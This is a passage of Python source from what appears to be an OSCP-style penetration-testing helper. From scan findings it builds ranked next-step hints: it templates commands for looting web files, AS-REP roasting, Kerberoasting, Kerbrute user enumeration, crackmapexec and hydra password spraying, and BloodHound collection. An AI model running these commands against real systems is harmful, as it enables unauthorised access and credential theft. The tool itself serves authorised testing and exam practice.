                    f"sudo mount -t nfs {ip}:{export} /mnt/nfs_enum && ls -la /mnt/nfs_enum/",
                ))

        # Sensitive/high-value web content
        seen_paths: set = set()
        for note in self.info.notes:
            m = re.search(r'SENSITIVE FILE:\s*(\S+)', note)
            if m:
                path = m.group(1)
                if path not in seen_paths:
                    seen_paths.add(path)
                    steps.append((
                        "high",
                        f"Sensitive file in web root: {path}",
                        f"curl -so /tmp/loot_{Path(path).name} http://{ip}{path} && file /tmp/loot_{Path(path).name}",
                    ))
            m2 = re.search(r'HIGH-VALUE PATH:\s*(\S+)', note)
            if m2:
                path = m2.group(1)
                if path not in seen_paths:
                    seen_paths.add(path)
                    steps.append((
                        "high",
                        f"High-value web path: {path}",
                        f"curl -sv http://{ip}{path} 2>&1 | head -60",
                    ))

        # Web file download hints
        for note in self.info.notes:
            m = re.search(r'DOWNLOAD FILE:\s*(https?://\S+)', note)
            if m:
                url = m.group(1)
                steps.append((
                    "high",
                    f"Downloadable file found: {url}",
                    f"wget '{url}' -O /tmp/loot_file && file /tmp/loot_file && strings /tmp/loot_file | grep -i pass",
                ))

        # Apache old version → searchsploit
        for note in self.info.notes:
            m = re.search(r'HIGH: Apache ([\d.]+) on port (\d+)', note)
            if m and _once(f"apache_{m.group(1)}"):
                ver = m.group(1)
                ver_mm = ".".join(ver.split(".")[:2])
                steps.append((
                    "high",
                    f"Apache {ver} (old) — check public exploits",
                    f"searchsploit apache {ver}\nsearchsploit apache {ver_mm}",
                ))

        # Samba version → searchsploit (medium — may have CVEs)
        for note in self.info.notes:
            m = re.search(r'INFO: Samba ([\d.]+) detected', note)
            if m and _once(f"samba_{m.group(1)}"):
                ver = m.group(1)
                ver_mm = ".".join(ver.split(".")[:2])
                steps.append((
                    "medium",
                    f"Samba {ver} — research known CVEs",
                    f"searchsploit samba {ver}\nsearchsploit samba {ver_mm}",
                ))

        # Database misconfigs
        for note in self.info.notes:
            if _once("db_empty") and re.search(r'database:.*(?:empty password|unauthenticated)', note, re.I):
                clean = re.sub(r'^\[\d{2}:\d{2}:\d{2}\] ', '', note)
                steps.append((
                    "high",
                    "Database with empty/no auth credentials",
                    clean[:120],
                ))

        # ── MEDIUM ───────────────────────────────────────────────────────────

        if self.info.users_found:
            # Password policy check MUST come before any spray
            if 445 in self.info.open_ports or 139 in self.info.open_ports:
                steps.append((
                    "medium",
                    "CHECK PASSWORD POLICY before ANY spray (avoid account lockout!)",
                    f"crackmapexec smb {ip} --pass-pol",
                ))

            if domain:
                steps.append((
                    "medium",
                    "AS-REP Roasting — find accounts without Kerberos pre-auth",
                    f"impacket-GetNPUsers {domain}/ -dc-ip {ip} -no-pass "
                    f"-usersfile {uf} -format hashcat "
                    f"-outputfile {ldap_dir}/asrep_hashes.txt",
                ))
                if 88 in self.info.open_ports and domain:
                    steps.append((
                        "medium",
                        "Kerbrute — validate users via Kerberos (no 4625 event, no lockout)",
                        f"kerbrute userenum -d {domain} --dc {ip} {uf}",
                    ))

            # Spray across discovered open services
            if 445 in self.info.open_ports or 139 in self.info.open_ports:
                steps.append((
                    "medium",
                    "Credential spray — SMB (after policy check)",
                    f"crackmapexec smb {ip} -u {uf} -p /usr/share/wordlists/rockyou.txt --no-bruteforce --continue-on-success",
                ))
            if 22 in self.info.open_ports:
                steps.append((
                    "medium",
                    "Credential spray — SSH (rate-limited, 4 threads)",
                    f"hydra -L {uf} -P /usr/share/wordlists/rockyou.txt ssh://{ip} -t 4 -w 3",
                ))
            if 5985 in self.info.open_ports or 5986 in self.info.open_ports:
                steps.append((
                    "medium",
                    "Credential spray — WinRM (once creds found → shell)",
                    f"crackmapexec winrm {ip} -u {uf} -p '<PASSWORD>'",
                ))
            if 1433 in self.info.open_ports:
                steps.append((
                    "medium",
                    "MSSQL access test",
                    f"crackmapexec mssql {ip} -u {uf} -p '<PASSWORD>'",
                ))

        # Kerberoasting (needs creds)
        for note in self.info.notes:
            if _once("kerberoast") and re.search(r'kerberoastable|serviceprincipalname.*spn', note, re.I) and domain:
                steps.append((
                    "medium",
                    "Kerberoastable SPNs found — Kerberoast (requires ANY valid credentials)",
                    f"impacket-GetUserSPNs {domain}/<USER>:<PASS> -dc-ip {ip} -request "
                    f"-outputfile {ldap_dir}/kerberoast_hashes.txt",
                ))
                break

        # LDAP description fields (classic OSCP cred storage)
        for note in self.info.notes:
            if _once("ldap_desc") and re.search(r'description.*password|accounts.*description', note, re.I):
                steps.append((
                    "medium",
                    "LDAP description fields found — often contain plaintext passwords",
                    f"grep -i 'description:' {ldap_dir}/ldap_descriptions.txt",
                ))
                break

        # BloodHound — only when DC confirmed
        if self.info.is_domain_controller and domain and _once("bloodhound"):
            steps.append((
                "medium",
                "DC confirmed — collect BloodHound graph (once ANY credentials found)",
                f"bloodhound-python -u <USER> -p <PASS> -d {domain} -ns {ip} -c All",
            ))

        # Credential reuse across ALL services
        if self.info.users_found and _once("cred_reuse"):
            open_svc_str = ", ".join(
                str(p) for p in sorted(self.info.open_ports)
                if p in {21, 22, 23, 80, 139, 443, 445, 1433, 3306, 3389, 5432, 5985, 5986}
            )
            if open_svc_str:
                steps.append((
                    "medium",
                    f"Credential REUSE — test every found cred against every service ({open_svc_str})",
                    f"crackmapexec smb {ip} -u <USER> -p <PASS> --continue-on-success",
                ))

        # ── INFO ─────────────────────────────────────────────────────────────
        if self.info.web_paths:
            steps.append((
                "info",
                f"{len(self.info.web_paths)} web paths discovered — manually review for LFI/SQLi/auth bypass",
                f"cat {self.target_dir}/web/gobuster*.txt 2>/dev/null | sort | uniq",
            ))

        for d in self.info.domains_found:
            if "." in d and d != domain and _once(f"host_{d}"):
                steps.append((
                    "info",
                    f"Hostname/domain discovered: {d} — add to /etc/hosts",
                    f"echo '{ip}  {d}' | sudo tee -a /etc/hosts",
                ))

        if self.info.domains_found and not domain:
            steps.append((
                "info",
                "Domain detected but not confirmed — rerun with --domain flag",
                f"python3 argus.py {ip} --domain {self.info.domains_found[0]}",
            ))

        # ── Version-based searchsploit — ALL detected service versions ────────
        # Iterates every port with a version string from Nmap and generates a
        # searchsploit hint.  Services already handled with specific logic above
        # (apache, samba, openssh) are skipped to avoid duplicates.
        _SPECIFIC_HANDLED = {"apache", "samba", "openssh"}

        # Service name normalisation map: substring → canonical searchsploit term
        _SVC_NORM: List[Tuple[str, str]] = [
            ("microsoft iis",   "iis"),
            ("iis httpd",       "iis"),
            ("apache httpd",    "apache"),
            ("apache tomcat",   "tomcat"),
            ("nginx",           "nginx"),
            ("proftpd",         "proftpd"),
            ("vsftpd",          "vsftpd"),
            ("filezilla",       "filezilla server"),
            ("openssh",         "openssh"),
            ("samba",           "samba"),
            ("postfix",         "postfix"),
            ("sendmail",        "sendmail"),
            ("dovecot",         "dovecot"),
            ("mysql",           "mysql"),
            ("mariadb",         "mariadb"),
            ("postgresql",      "postgresql"),
            ("microsoft sql",   "mssql"),
            ("ms sql",          "mssql"),
            ("redis",           "redis"),
            ("mongodb",         "mongodb"),
            ("elasticsearch",   "elasticsearch"),
            ("tomcat",          "tomcat"),
            ("jboss",           "jboss"),
            ("weblogic",        "weblogic"),
            ("glassfish",       "glassfish"),
            ("jenkins",         "jenkins"),
            ("wordpress",       "wordpress"),
            ("drupal",          "drupal"),
            ("joomla",          "joomla"),
            ("phpmyadmin",      "phpmyadmin"),
            ("openssl",         "openssl"),
            ("openssh",         "openssh"),
            ("php",             "php"),
        ]

        for port in sorted(self.info.open_ports):
            ver_str = self.info.port_details.get(port, {}).get("version", "") or ""
            # Skip empty, placeholder, or range version strings
            if not ver_str or ver_str in {"—", "-"} or re.search(r'\d+\.X', ver_str):
                continue

            # Extract first concrete version number (e.g. "7.4" from "OpenSSH 7.4 protocol 2.0")
            ver_m = re.search(r'(\d+\.\d+(?:\.\d+)?)', ver_str)
            if not ver_m:
                continue
            version = ver_m.group(1)

            # Normalise service name
            svc_raw = ver_str.lower()
            canonical = ""
            for pattern, name in _SVC_NORM:
                if pattern in svc_raw:
                    canonical = name
                    break
            if not canonical:
                # Fallback: first word of the version string
                canonical = re.split(r'[\s/]', ver_str)[0].lower()

            # Skip services already handled with specific logic
            if canonical in _SPECIFIC_HANDLED:
                continue

            dedup_key = f"ss_{canonical}_{version}"
            if not _once(dedup_key):
                continue

            ver_mm = ".".join(version.split(".")[:2])   # major.minor only
            steps.append((
                "info",
                f"Port {port} — {canonical} {version} detected: check for known exploits",
                f"searchsploit {canonical} {version}\n"
                f"searchsploit {canonical} {ver_mm}",
            ))

        return steps

    # ------------------------------------------------------------------
    # Internal setup
    # ------------------------------------------------------------------

    def _create_directories(self) -> None:
        self.target_dir.mkdir(parents=True, exist_ok=True)
        for d in self.dirs.values():
            d.mkdir(parents=True, exist_ok=True)

    def _setup_logging(self) -> logging.Logger:
        log = logging.getLogger(f"oscp.{self.target}")
        log.setLevel(logging.DEBUG if self.verbose else logging.INFO)
        log.propagate = False

        if log.handlers:
            return log

        # ── File handler only — structured JSON Lines (one JSON object / line)
        # Console output is handled exclusively by Rich in engine.py so there
        # are no interleaved plain-text log lines polluting the terminal UI.
        # Verbose mode (--verbose) additionally attaches a console handler so
        # DEBUG messages are visible when explicitly requested.
        log_file = self.target_dir / "session.jsonl"
        fh = logging.FileHandler(log_file, encoding="utf-8")
        fh.setLevel(logging.DEBUG)
        fh.setFormatter(_JsonFormatter())
        log.addHandler(fh)

        if self.verbose:
            console_fmt = logging.Formatter(
                fmt="%(asctime)s [%(levelname)s] %(message)s",
                datefmt="%H:%M:%S",
            )
            ch = logging.StreamHandler(sys.stdout)
            ch.setLevel(logging.DEBUG)
            ch.setFormatter(console_fmt)
            log.addHandler(ch)

        return log

    def _load_state(self) -> TargetInfo:
        state_path = self.target_dir / STATE_FILE
        if state_path.exists():
            if self.resume:
                try:
                    with state_path.open() as fh:
                        data = json.load(fh)
                    self.log.info(
                        "[*] Resuming session for %s — skipping already-completed modules",
                        self.target,
                    )
                    return TargetInfo.from_dict(data)
                except (json.JSONDecodeError, KeyError) as exc:
                    self.log.warning(
                        "Could not load previous state (%s) — starting fresh", exc
                    )
            else:
                self.log.info(
                    "session.json found for %s — pass --resume to continue it "
                    "(starting a fresh scan instead)",
                    self.target,
                )
        return TargetInfo(ip=self.target, domain=self.domain)
